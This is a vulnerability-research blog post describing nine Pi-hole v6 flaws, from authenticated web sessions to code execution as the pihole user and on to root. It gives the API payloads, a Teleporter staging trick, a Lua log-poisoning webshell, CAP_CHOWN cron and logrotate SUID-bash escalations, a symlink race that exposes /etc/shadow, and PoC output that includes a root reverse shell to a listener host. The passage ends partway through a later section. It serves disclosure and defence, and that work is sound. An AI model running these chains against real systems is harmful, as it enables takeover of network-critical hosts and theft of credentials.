---
title: "Pi-hole: root with extra steps"
summary: "Nine ways to compromise Pi-hole: five paths from a web session to code-exec, three LPEs to root-exec, one file-disclosure"
date: '2026-08-05T00:00:00Z'
lastmod: 2026-09-24T00:00:00Z
subtitle: "Root on the DNS server you forgot about"
tags: ["security", "offensive-security", "pi-hole", "privilege-escalation", "linux", "exploit", "CVE-2026-65963", "CVE-2026-50130"]
channels: ["vuln-research"]
---

This article was updated 2026-09-24 with several more vulnerabilities (and exploits), originally published 2026-08-05.

Pi-hole is one of those services people install because they want to stop thinking about it. It becomes the DNS server for every phone, laptop, TV, camera, and forgotten smart plug on the network, then lives on a Raspberry Pi nobody logs into again. Many use it for more than that like hosting DHCP for the network.

It's a highly privileged box that many people never patch with DNS authority for the network, running on hardware nobody logs into.

Pi-hole's core daemon, `pihole-FTL`, combines a patched fork of `dnsmasq`, a DHCP server, the CivetWeb HTTP server, the REST API, an embedded Lua runtime, SQLite, and mbedTLS in one C process. One process, one address space, one blast radius.

I audited Pi-hole v6 and this post is about nine of the more serious vulnerabilities that were discovered.

| #                            | Vulnerability                                                       | Required access                | Result                                 |
| ---------------------------- | ------------------------------------------------------------------- | ------------------------------ | ---------------------------------------|
| [1](#dnsmasq_lines-exec)     | dnsmasq `misc.dnsmasq_lines` -> `dhcp-luascript`                    | Web session                    | code exec as `pihole` (chains to root) |
| [2](#civetweb-advancedopts)  | CivetWeb `webserver.advancedOpts` -> `lua_background_script`        | Web session                    | code exec as `pihole` (chains to root) |
| [3](#advancedopts-part-2)    | CivetWeb `webserver.advancedOpts` -> `document_root` + WebDAV `PUT` | Web session                    | code exec as `pihole` (chains to root) + arbitrary file read |
| [4](#log-poison-to-lp-exec)  | `webserver.paths.webroot` + log poisoning -> `.lp`                  | Web session                    | code exec as `pihole` (chains to root) + arbitrary file read |
| [5](#teleporter)             | Teleporter import bypasses config validation                        | Web session                    | code exec as `pihole` (chains to root) |
| [6](#updatechecker-symlinks) | Root updatechecker follows a symlink                                | Code exec as `pihole`          | File disclosure or corruption          |
| [7](#cap_chown-chpwn)        | `CAP_CHOWN`                                                         | Code exec under FTL (`pihole`) | code exec as `root`                    |
| [8](#prestart-logrotate)     | Root prestart hook logrotate                                        | Code exec as `pihole`          | code exec as `root`                    |
| [9](#gravitysh-chown)        | Gravity files.gravity operates on pihole values, runs chown         | Code exec as `pihole`          | code exec as `root`                    |

Affected versions are available in the [PoCs table](#proofs-of-concept) at the end of the article.

The five web paths are authenticated. They require the main web login, or a Pi-hole intentionally running in no-password mode. Authenticated RCE - but sharing logins to a Pi-hole web interface would not generally be expected to lead to root code execution on the host.

The initial audit was performed on the latest versions at the time: Core 6.4.2, FTL 6.6.2, Web 6.5.1. Confirmed unpatched in HEAD and projects' current development branches at time of reporting.

## Teleporter

Pi-hole provides Teleporter for taking and importing backups. It makes an appearance in many of these PoCs and provides two main purposes, staging files and bypassing config validation.

### File Staging

Using the `backup-import` feature over the API allows us to write content to a few different files under /etc/pihole/ with varying levels of control over that content. A few work with varying levels of portability and challenges, but the cleanest is `dhcp.leases` which writes our content exactly.

In my testing on a Pi-hole installation that does not serve DHCP leases to the network, there is no impact to replacing dhcp.leases. A Pi-hole install that is serving DHCP leases would have its active leases disrupted. Could work around that by pointing dnsmasq to an alternative lease file.

This is key to several vulnerabilities that take us from web-session to pihole exec. I use this to stage:
- Lua payloads for `dhcp-luascript` / `lua_background_script`
- the `put_delete_auth_file` digest-auth file
- .lua webshells 

### Validation Bypass

When importing a backup through teleporter, it imports our `pihole.toml` without doing any of the normal validation on each value. Which means we can apply settings that are not normally allowed to be set through the web interface/API.

Some of those settings were restricted as a result of our earlier disclosures, and this re-opens some paths like the [logpoison technique](#log-poison-to-lp-exec) from a web-session again.

## dnsmasq_lines exec

Pi-hole v6 stores its configuration in `/etc/pihole/pihole.toml` and exposes it through `PATCH /api/config`. Most settings are normal DNS and DHCP controls. `misc.dnsmasq_lines` is an array of lines that gets copied into the generated `dnsmasq` configuration.

The validation prevents items in that array that contain newlines. But you don't need a newline, you can just inject options that execute code.

`dnsmasq` supports `dhcp-script` and `dhcp-luascript`, which execute a program for DHCP events. I use `dhcp-luascript` here for reasons explained later. Making the following API call:

```http
PATCH /api/config
Content-Type: application/json

{
  "config": {
    "misc": {
      "dnsmasq_lines": [
        "dhcp-luascript=/etc/pihole/x.lua",
        "script-arp"
      ]
    }
  }
}
```

FTL writes that line into the live configuration. When a DHCP event occurs, `dnsmasq` executes `/etc/pihole/x.lua` as the FTL process. In my tests, applying the configuration restarted FTL and `script-arp` caused the payload to run immediately.

The immediate result is code execution as `pihole`. CAP_CHOWN or the logrotate vulnerability turn that into root.

[Previous vulnerabilities](https://github.com/pi-hole/FTL/security/advisories/GHSA-9cqv-839p-gpq2) around this focused on injection through newline handling. This path does not need a newline though - the API already accepts a complete configuration, and `dhcp-luascript=` is a single valid element.

With local access as `pihole`, staging the script is trivial. With API access alone, this is actually a challenge which is where the [Teleporter method](#teleporter) for staging comes in.

The `dhcp-script` option works but requires the script file to be executable. Teleporter stages files owned by pihole and `chmod 600`. `dhcp-luascript` does not require the script to be executable so it works for Teleporter staged files. With a local foothold you can stage the script and make it executable and use either option.

For this, we need a valid Lua script. Create the target `dhcp.leases` file with your Lua script, create `teleport.dhcp.tar.gz` containing that file at the root, call the Pi-hole api at `/api/teleporter` and submit it as multipart/form-data with `file` set to the tgz contents. The high-level flow to stage your content at `/etc/pihole/dhcp.leases`:

```bash
$ printf 'os.execute("id > /tmp/exec-proof; grep ^Cap /proc/self/status >> /tmp/exec-proof")\nfunction lease() end' > dhcp.leases

$ tar -zcf teleport.dhcp.tar.gz dhcp.leases

$ curl -X POST http://pi.hole/api/teleporter -F "file=@teleport.dhcp.tar.gz"
```

dnsmasq requires dhcp-luascript scripts to have a lease() function. Without it your code will still run but it looks for the lease() function after and logs `lease() function missing in Lua script` before FTL exits. systemd restarts it and causes a restart loop. Add `function lease() end` to the Lua script to prevent this.

### PoC

PoC available at [dnsmasq_lines_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/dnsmasq_lines_exec.sh). Edit `PIPASS` and `PIHOST` to your Pi-hole IP/Host and run it. It will create the teleporter file, stage the dhcp.leases file on the pihole, and update the dnsmasq config to execute our crafted script.

This can be driven through the web interface also. Create the same teleporter .tgz file, Go to Settings -> Teleporter -> import your tgz -> "Import successful. Processed files: /etc/pihole/dhcp.leases". Then go to Settings -> All settings -> Miscellaneous -> misc.dnsmasq_lines -> enter the following:

```text
dhcp-luascript=/etc/pihole/dhcp.leases
script-arp
```

Click Save.

After running the PoC check /tmp/exec-proof:

```bash
$ cat /tmp/exec-proof 
uid=999(pihole) gid=1001(pihole) groups=1001(pihole)
CapInh: 0000000002807401
CapPrm: 0000000002807401
CapEff: 0000000002807401
CapBnd: 000001ffffffffff
CapAmb: 0000000002807401
```

### Am I Affected

Impacted: FTL Versions 6.0 - 6.7
Fixed: FTL 6.7.1

## CivetWeb advancedOpts

The second route is similar but on the other embedded server.

`webserver.advancedOpts` is a raw passthrough into CivetWeb. CivetWeb supports `lua_background_script`, which loads a Lua file in a background thread when the web server starts:

```http
PATCH /api/config
Content-Type: application/json

{
  "config": {
    "webserver": {
      "advancedOpts": [
        "lua_background_script=/etc/pihole/x.lua"
      ]
    }
  }
}
```

CivetWeb's Lua environment is not a restricted configuration language. It can invoke operating-system commands:

```lua
os.execute("id > /etc/pihole/pwn-hole-lua")
```

Saving the configuration restarts FTL, restarting FTL starts the web server, and the web server executes the background script.

Teleporter can again stage the file for an API-only chain:

```text
full admin session
    -> import x.lua
    -> set lua_background_script
    -> FTL restarts
    -> code executes as pihole
    -> logrotate or CAP_CHOWN chain
    -> root
```

An administrator is expected to be able to configure the DNS appliance. That is not the same as arbitrary shell execution on its operating system.

### PoC

PoC available at [civetweb_advancedopts_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/civetweb_advancedopts_exec.sh). Same as previous PoC - edit `PIPASS` and `PIHOST` to your Pi-hole IP/Host and run it. It will create the teleporter file, stage the dhcp.leases file on the pihole, and update the CivetWeb config to execute our crafted script.

Same as the first PoC this can be driven via the web interface. Create the same teleporter .tgz file, Go to Settings -> Teleporter -> import your tgz -> "Import successful. Processed files: /etc/pihole/dhcp.leases". Then go to Settings -> All settings -> Webserver and API -> webserver.advancedOpts -> enter the following:

```text
lua_background_script=/etc/pihole/dhcp.leases
```

Click Save.

After running the PoC check /tmp/exec-proof:

```bash
$  cat /tmp/exec-proof 
uid=999(pihole) gid=1001(pihole) groups=1001(pihole)
CapInh: 0000000002807401
CapPrm: 0000000002807401
CapEff: 0000000002807401
CapBnd: 000001ffffffffff
CapAmb: 0000000002807401
```

### Am I Affected

Impacted: FTL Versions 6.3 - 6.6.2  
Fixed: FTL Version 6.7 (but the fix is by-passable, see [advancedOpts: Part 2](#advancedopts-part-2) in post-disclosure)

Official advisory states version 6.6.2 as the only impacted version. Commit [f9551b08](https://github.com/pi-hole/FTL/commit/f9551b085824704c1deb50edfde844d1b8248659) "Add webserver.advancedOpts to allow specifying arbitrary CivetWeb options" was introduced in v6.3 though. Tested and confirmed against v6.4.

## CAP_CHOWN (CHPWN)

Pi-hole does not run FTL as root. systemd starts it as `pihole`, but with this capability set:

```bash
$ grep -E "^Cap(Eff|Amb|Bnd)" /proc/$(pgrep -x pihole-FTL)/status
CapEff: 0000000002807401
CapBnd: 000001ffffffffff
CapAmb: 0000000002807401

$ capsh --decode=0x0000000002807401
0x0000000002807401=cap_chown,cap_net_bind_service,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_sys_nice,cap_sys_time
```

The systemd unit:

```ini
[Service]
User=pihole
AmbientCapabilities=CAP_CHOWN CAP_NET_BIND_SERVICE CAP_NET_ADMIN CAP_NET_RAW CAP_IPC_LOCK CAP_SYS_NICE CAP_SYS_TIME
```

Most of that list has an obvious relationship to DNS, DHCP, networking, or the built-in NTP service. `CAP_NET_ADMIN` and `CAP_NET_RAW` are interesting but `CAP_CHOWN` is the standout and the most immediately exploitable. It lets the process change the UID and GID of files regardless of their current owner. Ambient capabilities survive `execve` which means we can just directly run `chown`.

That is a quick hop to root - use `pihole` to take ownership and alter the contents of a file that root later executes. You can use any number of paths, I will provide several.

One example is `cron`. Typically you would just drop a file into `/etc/cron.d`. Except the Pi-hole systemd unit file has `ProtectSystem=full` which mounts /etc read-only. But `full` leaves more open than `strict`, including /var, so on Debian-family systems just place the crontab in `/var/spool/cron/crontabs/root` (/var/spool/cron/root on RHEL family) and same result, root exec.

End-to-end example in PoC below (must be run from within FTL process to have `CAP_CHOWN`, not an ssh session).

Another consequence of using `ProtectSystem=full` instead of `strict` is that we can replace the pihole scripts themselves. They live in `/opt/pihole` which is not read-only under `full`. Pick one:

```
-rwxr-xr-x 1 root root pihole-FTL-poststop.sh
-rwxr-xr-x 1 root root pihole-FTL-prestart.sh
-rwxr-xr-x 1 root root piholeLogFlush.sh
-rwxr-xr-x 1 root root updatecheck.sh
```

Same as above, chown the directory, replace/modify the script, chown it back, and trigger Pi-hole to execute it (update check, service restart, etc). Cron executes the updatecheck.sh as root daily at midnight. If you inspect the systemctl unit for pihole you will see:

``` bash
$ systemctl cat pihole-FTL | grep -E "^(ExecStartPre|ExecStopPost)"
ExecStartPre=+/opt/pihole/pihole-FTL-prestart.sh
ExecStopPost=+/opt/pihole/pihole-FTL-poststop.sh
```

The `+` means these scripts will run as root. So chown either of them, edit to add your lines, chown it back, wait for a restart or trigger one.

### PoC

This needs to be run from within FTL process, so typically as a chain with another vulnerability. PoCs are available at the end for the chains.

```bash
$ chown_cmd="$( command -v gnuchown || command -v chown )"

$ "$chown_cmd" pihole:pihole /var/spool/cron/crontabs

$ "$chown_cmd" pihole:pihole /var/spool/cron/crontabs/root 2>/dev/null || true

$ echo '* * * * * id > /tmp/pi-hole-cron-spool 2>&1' >> /var/spool/cron/crontabs/root

$ chmod 600 /var/spool/cron/crontabs/root

$ "$chown_cmd" root:crontab /var/spool/cron/crontabs/root

$ "$chown_cmd" root:crontab /var/spool/cron/crontabs
```

After running that and waiting 60 seconds you should see:

```bash
$ cat /tmp/pi-hole-cron-spool
uid=0(root) gid=0(root) groups=0(root)
```

The gnuchown check is because an Ubuntu26 system I tested this against was using the modern rust-coreutils package. That version of chown ran openat(O_RDONLY) on the target directory before changing ownership. This fails and it exits before attempting the chown. GNU gnuchown works and was installed by default on my test machine. Calling the chown() syscall directly works also. The linked PoC selects gnuchown when available.

### Am I Affected

Impacted: FTL Versions 6.0 - 6.7
Fixed: FTL 6.7.1

To verify, check the caps of your running FTL process and see if it has `cap_chown`:

```bash
$ grep -E "^CapEff" /proc/$(pgrep -x pihole-FTL)/status
CapEff: 0000000002807401

$ capsh --decode="2807401"
0x0000000002807401=cap_chown,cap_net_bind_service,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_sys_nice,cap_sys_time
```

## Prestart logrotate

This path does not require CAP_CHOWN. The pihole user already controls the directory entry, and the root prestart hook supplies the trusted ownership on the attacker’s behalf.

Pi-hole ships its `logrotate` configuration stored in `/etc/pihole/logrotate` instead of the usual `/etc/logrotate.d/`. logrotate is interesting in that it accepts configuration options (`firstaction`, `postrotate`, etc) that will execute a script as the caller (root) so it is one of the reliable methods of turning a file write into code execution. It rejects an untrusted configuration file by requiring the file not be group/world-writable and that the file is owned by root.

The pihole-FTL systemd service runs a prestart script with elevated privileges:

```ini
[Service]
User=pihole
ExecStartPre=+/opt/pihole/pihole-FTL-prestart.sh
```

The `+` prefix tells systemd to run the command outside the unit's normal user and credential restrictions. The prestart script runs as root and on each run it executes:

```bash
chown -R pihole:pihole /etc/pihole/ /var/log/pihole/
chown root:root /etc/pihole/logrotate
```

That file lives in a directory owned by `pihole`. Owning the directory means `pihole` can replace the pathname even when the current inode is root-owned.

### PoC

PoC available at [prestart_logrotate.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/prestart_logrotate.sh).

The complete path end-to-end as `pihole`:

```bash
$ mv /etc/pihole/logrotate /etc/pihole/logrotate.save
$ cat > /etc/pihole/logrotate <<'EOF'
/var/log/pihole/pihole.log {
    daily
    rotate 1
    postrotate
        install -m 4755 /bin/bash /usr/local/bin/pihole-root
        id > /tmp/pwn-hole-logrotate-id
        grep -E "^Cap(Eff|Bnd)" /proc/self/status >> /tmp/pwn-hole-logrotate-caps
    endscript
}
EOF

$ chmod 600 /etc/pihole/logrotate
```

Restart pihole-FTL and the root prestart hook chowns the logrotate file to root:root. Pi-hole has a /etc/cron.d/pihole entry that triggers its logrotate runs at midnight every day and on reboots. The next reboot or midnight run executes the postrotate block as root. In this example it leaves an suid bash in /usr/local/bin/pihole-root and two evidence files in /tmp.

The next root logrotate run (after FTL restart) accepts the file as root-owned and runs the attacker's `postrotate` command as root:

```console
$ cat /tmp/pwn-hole-logrotate-id
uid=0(root) gid=0(root) groups=0(root)

$ cat /tmp/pwn-hole-logrotate-caps
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff

$ /usr/local/bin/pihole-root -p -c id
uid=999(pihole) gid=995(pihole) euid=0(root) groups=995(pihole)
```

### Am I Affected

Impacted: Versions 6.0 - 6.4.2  
Fixed: Version 6.4.3

## updatechecker symlinks

A separate root cron job runs `pihole updatechecker`. That script runs the following:

```bash
VERSION_FILE="/etc/pihole/versions"

truncate -s 0 "${VERSION_FILE}"
chmod 644 "${VERSION_FILE}"

# Version data is then appended to the same path.
```

None of those operations refuse symlinks. Same as the earlier logrotate vulnerability, because `pihole` controls `/etc/pihole`, it controls `/etc/pihole/versions` and it can point it to any file.

Something like:

```bash
# DO NOT RUN THIS UNLESS YOU WANT TO BREAK YOUR PI-HOLE
$ ln -sf /etc/shadow /etc/pihole/versions
```

The next update check follows the symlink, truncates `/etc/shadow`, changes its mode, and appends version data to it. Effectively breaking the system, so not ideal.

This is three separate file operations: the truncate -> chmod -> write. If we race the operations we can replace the symlink in-between so it points to a different file at each operation. It looks like a difficult race given the operations are consecutive. Fortunately, this is a shell script which means each operation is a separate exec, which means we can easily win the race 100% of the time in my testing.  

My approach to winning the race to expose a root-owned file without truncating it or writing version strings into it:

1. Stage a symlink to /etc/shadow for a later fast rename operation.
2. Leave a non-empty `versions` file in place for the initial `truncate`.
3. Watch `inotify` on the `versions` file for the resulting `IN_MODIFY` event.
4. Replace the `versions` file using `renameat2(RENAME_EXCHANGE)` on the prepared symlink.
5. Let root's `chmod 644` land through the symlink on the target.
6. Watch `inotify` on /etc for the resulting `IN_ATTRIB` event.
7. Rename the truncated file back to `versions`.
8. The update script does its normal append to the correct file.
9. Everything downstream works normally. This does not break or interrupt any normal update operations.

The target is left intact except for its mode. The updater writes its version data to the real file. Against `/etc/shadow`, the result is readable password hashes. Against a useful root credential or private key, it can be a direct privilege escalation. The PoC worked and won each race 250 times out of 250 tests on my test system running Ubuntu 26.04.

PoC is in the table at the end. One word of caution, if you were to lose a race you have a reasonable chance of appending a bunch of version-file junk to your /etc/shadow.

`fs.protected_symlinks` does not stop this path. That protection is aimed at symlinks in sticky, world-writable directories such as `/tmp`. `/etc/pihole` is an ordinary directory controlled by the service account, so the root process follows the link normally.

This is another bug where a root job is performing security-sensitive operations in a directory whose entries are controlled by `pihole`. Following symlinks especially when they are owned by a different user would need a valid use-case and a lot of care.

### PoC

PoC available at [updatecheck_symlink.py](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/updatecheck_symlink.py).

```bash
$ ls -al /etc/shadow
---------- 1 root shadow 1080 Jul  4 11:48 /etc/shadow

$ python3 updatecheck_symlink.py
[-] staged, waiting for the next updatechecker cron...
[+] decoy fired. symlink staged, waiting for chmod..
[+] /etc inotify fired. symlink (hopefully) landed. swapped versions file. done
[+] worked. /etc/shadow is now chmod 644

$ ls -al /etc/shadow
-rw-r--r-- 1 root shadow 1080 Jul  4 11:48 /etc/shadow
```

### Am I Affected

Impacted: Core Versions 6.0 - current  
Fixed: not yet

## Chaining web to root

If you have a web login, the several configuration findings give code execution as the FTL service account. Pick one of the LPEs and turn that into root.

```text
full Pi-hole admin session, or no-password mode
    -> write raw dnsmasq or CivetWeb options
    -> execute code as pihole
        -> CAP_CHOWN + cron
           or root prestart + logrotate
            -> uid 0
```

If you already have a local foothold as `pihole` you're already halfway there and pick from the same LPEs. If the foothold executes inside FTL, the process inherits FTL’s ambient capabilities and can use the CAP_CHOWN path.

A plain shell running as pihole (over ssh, etc) does not have those capabilities, but it can still use the prestart/logrotate LPE and updatechecker paths. Or you can just modify the pihole configuration locally, add the exec configurations (dhcp-luascript, etc) or change the webroot, use that exec from within FTL to leverage CAP_CHOWN, done.

A recurring failure across the findings: root and `pihole` shared control over the same pathnames. Sometimes `pihole` supplied the contents and `CAP_CHOWN` supplied the owner. Sometimes a root prestart hook supplied the owner. Sometimes a root cron job followed a pathname while `pihole` swapped the object underneath it.

The individual bugs are different. The trust failure is the same.

### PoC

PoC is available at [poc/pi-hole/chain_dnsmasq_logrotate_root.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_dnsmasq_logrotate_root.sh)

End-to-end from web session to root on the Pi-hole host:

```bash
$ ./chain_dnsmasq_logrotate_root.sh
[*] logged in, sid=WVPwEDd8****
[*] saved backup at pihole-backup-original.zip
[*] built payload.tar.gz for Teleporter
[+] staged /etc/pihole/dhcp.leases on pihole host
[+] pihole loaded our dnsmasq config, check for exec result on pihole host
[*] pihole should have executed the code and attempted escalation
[*] if vulnerable version with CAP_CHOWN root will execute your code within 60 seconds
[*] otherwise root will execute your code after the next FTL restart -> logrotate cycle
```

#### Am I Affected

Impacted: Versions 6.0 - 6.7
Fixed: 6.7.1

### PoC Chain 2

PoC is available at [poc/pi-hole/chain_advancedopts_webdav_capchown.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_advancedopts_webdav_capchown.sh)

I added a Lua webshell, the direct real-time output makes it much easier to know the results of your attempts. With this I can write a much better PoC than the first one.

Also added a reverse shell to this one to try to make a simpler PoC to share.

End-to-end again from web session to root on the Pi-hole host:

```text
$ ./chain_advancedopts_webdav_capchown.sh --reverse-shell --reverse-shell-ip=192.168.122.1 --reverse-shell-port=9009
[*] session established with http://192.168.122.59 sid=pUQrD6hO****
[*] created put_delete_auth_file dhcp.leases teleporter file
[*] staged /etc/pihole/dhcp.leases through Teleporter
[*] set advancedOpts: {"serve_all":true,"advancedOpts":["put_delete_auth_file=/etc/pihole/dhcp.leases","document_root=/"]}
[*] staged /etc/pihole/x.lua
[+] called x.lua LUACMD cmd=hostname;uptime;id;grep ^Cap /proc/self/status;pihole version:
pihole-server
 20:21:47 up 3 days,  9:22,  1 user,  load average: 1.00, 1.00, 1.00
uid=999(pihole) gid=1001(pihole) groups=1001(pihole)
CapInh: 0000000002807401
CapPrm: 0000000002807401
CapEff: 0000000002807401
CapBnd: 000001ffffffffff
CapAmb: 0000000002807401
Core
    Version is v6.4.3 (Latest: v6.4.3)
    Branch is master
    Hash is f47b8ede (Latest: f47b8ede)
Web
    Version is N/A (Latest: N/A)
    Branch is N/A
    Hash is N/A (Latest: N/A)
FTL
    Version is v6.7 (Latest: v6.7.1)
    Branch is master
    Hash is fa65a88f (Latest: 0bf029ba)
[+] accessed /etc/passwd:
root:x:0:0:root:/root:/bin/bash
k:x:1000:1000:k:/home/k:/bin/bash
kk:x:1002:1002:,,,:/home/kk:/bin/bash
[*] attempting privilege escalation
[*] staged /etc/pihole/privesc.sh
[*] calling x.lua privilege escalation cmd=bash /etc/pihole/privesc.sh rshell 192.168.122.1 9009
  [privesc] 
[-] did not receive success signal from privesc.sh
[*] - our pkill pihole-FTL prevents the signal being flushed
[*] starting listener for remote shell
root@pihole-server:/# id
id
uid=0(root) gid=0(root) groups=0(root),1001(pihole)
root@pihole-server:/# grep ^Cap /proc/self/status
grep ^Cap /proc/self/status
CapInh: 0000000000000000
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
```

#### Am I Affected

Impacted: Versions 6.3 - 6.7
Fixed: 6.7.1 (still get pihole exec, no direct root exec LPE from there, only root file disclosure or gravity approach)

### PoC Chain 3

Chain for the log poison to .lp exec and retained cap_chown privilege laid out in [Post-Disclosure Research](#post-disclosure-research) for use on the latest v6.7. Gets pi-hole exec on latest release v6.7.1, but only chains it to direct root exec up to v6.7. For 6.7.1 to escalate you would need to use one of the file-disclosure or the gravity chown approach. Just run those components separately, I have provided PoCs for each.

PoC is available at [poc/pi-hole/chain_logpoison_lp_capchown.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_logpoison_lp_capchown.sh)

```text
$ ./chain_logpoison_lp_capchown.sh 
Skipping cleanup: to enable run with --cleanup
[*] logged in, sid=pdQdWan+***
[*] Setting FTL and webserver log file locations
[+] pihole loaded our webserver log file change
[+] pihole loaded our FTL log file change
[+] pihole loaded our webroot config
[*] sleeping for 10s to give FTL time to reload..
[*] sending DELETE request to get our <?lua ... ?> logged unescaped
[+] DELETE sent, 404 means it should (might?) be logged
[*] checking if our lua worked
[*] current user: uid=999(pihole) gid=1001(pihole) groups=1001(pihole)
[*] current effective caps: 0000000002807401
[*] decoded caps: 0x0000000002807401=cap_chown,cap_net_bind_service,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_sys_nice,cap_sys_time
[*] running privilege escalation
  [privesc] 2026-09-25 14:58:09.797 UTC [71432/T71520] WARNING: API: URI error - skipping invalid ID in path (/api/info/messages): 
[-] did not receive success signal from privesc.sh
[*] - our pkill pihole-FTL prevents the signal being flushed
[*] - waiting 10s and checking for root proof anyway..
[+] success, root exec
2026-09-25 14:58:09.797 UTC [71432/T71520] WARNING: API: URI error - skipping invalid ID in path (/api/info/messages): pihole-server
 14:58:12 up 3 days,  3:59,  1 user,  load average: 1.00, 1.00, 1.00
uid=0(root) gid=0(root) groups=0(root),1001(pihole)
CapInh: 0000000000000000
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
Core version is v6.4.3 (Latest: v6.4.3)
Web version is v6.6 (Latest: v6.6)
FTL version is v6.7 (Latest: v6.7.1)
```

#### Am I Affected

Impacted: Versions 6.3 - 6.7
Fixed: 6.7.1 (still get pihole exec, no direct root exec LPE from there, only root file disclosure or gravity approach)

## Post-Disclosure Research

I continued to do research after the initial disclosures. Pi-hole is a surprisingly complex app and there was still a lot I wanted to explore.

I am documenting those findings here.

### advancedOpts: Part 2

`webserver.advancedOpts` again. CVE-2026-65963 used lua_background_script, and the v6.7 fix ([eb6ca080](https://github.com/pi-hole/FTL/commit/eb6ca080)) rejects any option whose key starts with lua_. But CivetWeb's option list is long, and there are several more non-lua_ entries that are just as useful.

`document_root` exposes the entire filesystem to web requests, `put_delete_auth_file` turns on WebDAV PUT, which is enough to write and then execute a .lua. These are independent of the `lua_background_script` path. They've worked since advancedOpts landed in v6.3 and survive the v6.7 fix, which blacklisted lua_*.

#### Arbitrary file read

`document_root` is not a `lua_` option, so it is still allowed. Point it at `/` and enable `serve_all`:

```http
PATCH /api/config
Content-Type: application/json

{
  "config": {
    "webserver": {
      "serve_all": true,
      "advancedOpts": ["document_root=/"]
    }
  }
}
```

FTL's request handler passes the request to CivetWeb's built-in file handler for anything outside `/admin`. That handler serves from the `document_root` we just set which is `/`. Sending a request like:

```bash
$ curl -s "http://pi.hole/etc/passwd"
root:x:0:0:root:/root:/bin/bash
```

Any file readable by `pihole`, over HTTP, no authentication on the request itself.

#### Code execution

Pi-hole rewrites `.lp` requests but not `.lua`. A `.lua` file under `document_root` is handed to CivetWeb's Lua handler and executed (default `lua_script_pattern = **.lua$`), and that Lua is not sandboxed. To stage the file, enable CivetWeb's WebDAV `PUT` - gated by another non-`lua_` option, `put_delete_auth_file`, whose password file Teleporter (from the first finding) can stage:

```text
from web session:
-> teleporter: stage "user:pi.hole:<md5(user:realm:pass)>" as /etc/pihole/dhcp.leases
-> advancedOpts = put_delete_auth_file=/etc/pihole/dhcp.leases, document_root=/  + serve_all=true
-> PUT /etc/pihole/x.lua   (HTTP Digest auth, staged creds)   -> written as pihole
-> GET /etc/pihole/x.lua?cmd=id   (no auth)                   -> executes as pihole
-> CAP_CHOWN or logrotate chain                               -> root
```

The digest realm is `webserver.domain` (default `pi.hole`), readable from `GET /api/config/webserver/domain`. The trigger `GET` needs no auth - Pi-hole only enforces authentication for pages under `/admin`. None of `document_root`, `put_delete_auth_file`, or `serve_all` starts with `lua_`, so the v6.7 fix never sees them. It is a denylist of one prefix where an allowlist was needed.

#### PoC

PoC available at [civetweb_advancedopts_put.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/civetweb_advancedopts_put.sh).

The PoC enables both the arbitrary file disclosure and also stages `x.lua` as a `?cmd=` webshell:

```bash
$ curl -s "http://pi.hole/etc/pihole/x.lua?cmd=id"
uid=999(pihole) gid=1001(pihole) groups=1001(pihole)

$ curl -s "http://pi.hole/etc/passwd" | grep root
root:x:0:0:root:/root:/bin/bash
```

#### Am I Affected

Impacted: Versions 6.3 - 6.7 (the CVE-2026-65963 fix does not remediate this)
Fixed: FTL 6.7.1

`webserver.advancedOpts` arrived in v6.3 ([`f9551b08`](https://github.com/pi-hole/FTL/commit/f9551b085824704c1deb50edfde844d1b8248659)). The v6.7 fix only added the `lua_` reject. Tested against v6.6.2 and v6.7.

### Log poison to .lp exec

The route in [advancedOpts: Part 2](#advancedopts-part-2) used `document_root` to point CivetWeb at `/` and serve the whole filesystem. The draft fix locks `advancedOpts`, so that key is gone - but `document_root` was only ever a means to an end. The goal is to serve an attacker-chosen path and execute Lua from it, and two config keys reach it that are not on the fix's list:

```http
PATCH /api/config
Content-Type: application/json
{
  "config": {
    "webserver": {
      "paths": { "webroot": "/" },
      "serve_all": true
    }
  }
}
```

`webserver.paths.webroot` is the same document_root through another path. Its validator checks the characters in the path, not where the path points. That restores the arbitrary read.

Execution is the harder half. The earlier route relied on `.lua` files and the fix sets `lua_script_pattern` empty (disabling it) - but `.lua` is not the only executable page type. Pi-hole's web interface is built from Lua Server Pages (`.lp`), and `lua_server_page_pattern = **.lp$` is configured for that. FTL calls `FTL_rewrite_pattern()` and takes `document_root + request_uri`, and rewrites to the matching `.lp` if one is readable.

Which leaves writing a `.lp` with contents you control. FTL log file names (and paths) can be set through the API. We just need to find a request that will result in a log entry with our attacker-influenced string containing unescaped and valid Lua `(<?lua ... ?>)`. Sending `DELETE /api/info/messages/<id>` with a non-numeric id causes an error to be written to the log. By sending valid Lua url-encoded in `<id>` we get a log line like:

```
2026-08-16 04:10:31.213 UTC [96728/T99796] WARNING: API: URI error - skipping invalid ID in path (/api/info/messages): <?lua mg.write(io.popen(mg.get_var(table.unpack{mg.request_info.query_string or ""; "cmd"}) or "id"):read("*a")) ?>
```

When we request that log file the surrounding non-Lua content is returned directly and the `<?lua ... ?>` is executed. In this case our Lua is a web shell so:

```
$ curl http://pi.hole/var/log/x?cmd=id
... (unrelated log lines trimmed)
2026-08-16 04:10:31.213 UTC [96728/T99796] WARNING: API: URI error - skipping invalid ID in path (/api/info/messages): uid=999(pihole) gid=1001(pihole) groups=1001(pihole)
```

Or for commands with args pass `--url-query "cmd=cat /tmp/something"` to curl.

So the full chain to exec:
- change the log name to `x.lp`
- change the document root to `/` + serve_all=true
- cause the log line carrying `<?lua ... ?>`
- request the log path
- chown your way to root

#### PoC

PoC is available in the advisories repo as [logpoison_lp_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/logpoison_lp_exec.sh).

### Prestart symlinks

The prestart script `pihole-FTL-prestart.sh` runs this:

```bash
